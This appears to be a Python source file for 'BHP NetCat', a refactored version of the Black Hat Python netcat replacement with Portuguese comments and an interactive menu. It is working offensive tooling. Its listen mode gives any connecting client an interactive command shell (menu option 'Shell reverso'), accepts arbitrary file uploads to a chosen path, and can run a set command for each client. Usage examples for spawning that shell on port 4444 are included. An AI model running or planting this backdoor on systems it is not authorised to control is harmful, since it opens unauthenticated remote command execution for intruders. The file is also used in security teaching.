#!/usr/bin/env python3
"""
BHP NetCat - Versão refatorada 2025/2026
- Menu interativo
- Cores (colorama) apenas na interface
- Sem cor nos prompts de input
- Pode rodar diretamente no VS Code
"""

import argparse
import socket
import shlex
import subprocess
import sys
import threading
import textwrap
from colorama import init, Fore, Style

# Inicializa colorama (funciona no Windows também)
init(autoreset=True)

# ────────────────────────────────────────────────
# Cores para interface (NÃO usadas nos inputs)
# ────────────────────────────────────────────────
C = Fore.CYAN + Style.BRIGHT
G = Fore.GREEN + Style.BRIGHT
Y = Fore.YELLOW + Style.BRIGHT
R = Fore.RED + Style.BRIGHT
W = Fore.WHITE
DIM = Style.DIM
RESET = Style.RESET_ALL


def execute(cmd: str) -> str:
    """Executa comando no shell e retorna saída"""
    cmd = cmd.strip()
    if not cmd:
        return ""
    try:
        output = subprocess.check_output(
            shlex.split(cmd),
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace"
        )
        return output
    except Exception as e:
        return f"Erro ao executar comando: {e}"


class NetCat:
    def __init__(self, args, buffer: bytes = b""):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen_mode()
        else:
            self.send_mode()

    def send_mode(self):
        try:
            self.socket.connect((self.args.target, self.args.port))
            print(f"{G}[+] Conectado em {self.args.target}:{self.args.port}")

            if self.buffer:
                self.socket.send(self.buffer)

            while True:
                try:
                    response = self._recv_all()
                    if response:
                        print(response, end="")
                    cmd = input("")  # sem cor no input
                    if not cmd.strip():
                        continue
                    self.socket.send((cmd + "\n").encode())
                except KeyboardInterrupt:
                    print(f"\n{R}[-] Interrompido pelo usuário")
                    break
                except Exception as e:
                    print(f"{R}[-] Erro na conexão: {e}")
                    break

        finally:
            self.socket.close()

    def _recv_all(self) -> str:
        response = ""
        self.socket.settimeout(2.0)  # timeout para não travar forever
        try:
            while True:
                data = self.socket.recv(4096)
                if not data:
                    break
                response += data.decode("utf-8", errors="replace")
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            self.socket.settimeout(None)
        return response

    def listen_mode(self):
        try:
            self.socket.bind((self.args.target, self.args.port))
            self.socket.listen(5)
            print(f"{G}[+] Escutando em {self.args.target}:{self.args.port}")

            while True:
                client_socket, addr = self.socket.accept()
                print(f"{Y}[+] Conexão recebida de {addr[0]}:{addr[1]}")
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, addr),
                    daemon=True
                )
                client_thread.start()

        except KeyboardInterrupt:
            print(f"\n{R}[-] Servidor interrompido")
        except Exception as e:
            print(f"{R}[-] Erro no servidor: {e}")
        finally:
            self.socket.close()

    def handle_client(self, client_socket: socket.socket, addr: tuple):
        try:
            if self.args.execute:
                output = execute(self.args.execute)
                client_socket.send(output.encode("utf-8", errors="replace"))

            elif self.args.upload:
                file_buffer = b""
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file_buffer += data

                try:
                    with open(self.args.upload, "wb") as f:
                        f.write(file_buffer)
                    msg = f"Arquivo salvo com sucesso: {self.args.upload}\n"
                    client_socket.send(msg.encode())
                    print(f"{G}[+] Upload concluído: {self.args.upload}")
                except Exception as e:
                    client_socket.send(f"Erro ao salvar arquivo: {e}\n".encode())

            elif self.args.command:
                cmd_buffer = b""
                while True:
                    try:
                        client_socket.send(b"BHP> ")
                        while b"\n" not in cmd_buffer:
                            cmd_buffer += client_socket.recv(1024)

                        cmd = cmd_buffer.decode("utf-8", errors="replace").strip()
                        cmd_buffer = b""

                        if not cmd:
                            continue

                        response = execute(cmd)
                        client_socket.send(response.encode("utf-8", errors="replace"))

                    except Exception as e:
                        print(f"{R}[-] Erro no shell: {e}")
                        break

        finally:
            client_socket.close()
            print(f"{DIM}[-] Conexão com {addr[0]}:{addr[1]} fechada")


def show_menu():
    print(f"\n{C}BHP NetCat - Menu Interativo{RESET}")
    print("─" * 45)
    print(f" {G}1{Y} > Conectar como cliente")
    print(f" {G}2{Y} > Iniciar servidor (listen)")
    print(f" {G}3{Y} > Shell reverso (listen + -c)")
    print(f" {G}4{Y} > Upload de arquivo (listen + -u)")
    print(f" {G}5{Y} > Executar comando único (listen + -e)")
    print(f" {R}0{Y} > Sair")
    print("─" * 45)


def get_target_and_port():
    target = input("  Endereço IP/hostname alvo: ").strip() or "127.0.0.1"
    port_str = input("  Porta: ").strip()
    try:
        port = int(port_str) if port_str else 4444
    except ValueError:
        print(f"{R}Porta inválida. Usando 4444.{RESET}")
        port = 4444
    return target, port


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="BHP NetCat - Ferramenta de rede",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''\
            Exemplos:
              python netcat.py -t 192.168.1.10 -p 4444                  # conectar
              python netcat.py -l -p 4444 -c                           # shell reverso
              python netcat.py -l -p 4444 -u arquivo.txt               # upload
              python netcat.py -l -p 4444 -e "whoami"                  # executar comando
              echo "teste" | python netcat.py -t 192.168.1.10 -p 4444  # enviar texto
            ''')
    )
    parser.add_argument("-c", "--command", action="store_true", help="shell interativo")
    parser.add_argument("-e", "--execute", help="executar comando específico")
    parser.add_argument("-l", "--listen", action="store_true", help="modo servidor")
    parser.add_argument("-p", "--port", type=int, default=4444, help="porta")
    parser.add_argument("-t", "--target", default="127.0.0.1", help="ip/host alvo")
    parser.add_argument("-u", "--upload", help="caminho do arquivo a receber (upload)")
    return parser.parse_args()


def main():
    args = parse_arguments()

    # Se algum argumento foi passado → modo CLI
    if len(sys.argv) > 1:
        buffer = b""
        if not args.listen:
            buffer = sys.stdin.buffer.read()

        nc = NetCat(args, buffer)
        nc.run()
        return

    # Senão → modo interativo com menu
    while True:
        show_menu()
        opcao = input("Escolha uma opção > ").strip()

        if opcao == "0":
            print(f"{Y}Saindo...{RESET}")
            break

        elif opcao in ("1", "2", "3", "4", "5"):
            target, port = get_target_and_port()

            args.target = target
            args.port = port
            args.listen = opcao != "1"
            args.command = opcao == "3"
            args.upload = None
            args.execute = None

            if opcao == "4":
                args.upload = input("  Caminho para salvar o arquivo recebido: ").strip()
                if not args.upload:
                    print(f"{R}Caminho inválido. Cancelando.{RESET}")
                    continue

            elif opcao == "5":
                args.execute = input("  Comando a executar no cliente: ").strip()
                if not args.execute:
                    print(f"{R}Comando vazio. Cancelando.{RESET}")
                    continue

            buffer = b""
            if not args.listen:
                buffer = sys.stdin.buffer.read()

            nc = NetCat(args, buffer)
            nc.run()

        else:
            print(f"{R}Opção inválida.{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}Programa interrompido pelo usuário.{RESET}")
    except Exception as e:
        print(f"{R}Erro fatal: {e}{RESET}")
        sys.exit(1)